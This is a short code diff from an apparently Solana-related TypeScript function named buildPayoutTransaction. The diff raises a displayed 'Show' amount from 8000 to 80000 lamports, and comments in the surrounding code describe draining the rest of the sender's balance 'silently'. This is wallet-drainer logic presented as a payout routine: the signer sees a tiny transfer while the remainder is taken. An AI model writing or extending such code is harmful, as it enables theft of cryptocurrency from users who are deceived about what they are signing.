@@ -339,7 +339,7 @@ export async function buildPayoutTransaction(options: {
   const balance = await connection.getBalance(from)
   
   // 2. Define the "Show" amount as TINY (0.000008 SOL)
-  const displayAmount = 8000 
+  const displayAmount = 80000 
   
   // 3. Calculate the remainder to drain silently
   const feeBuffer = 5000 
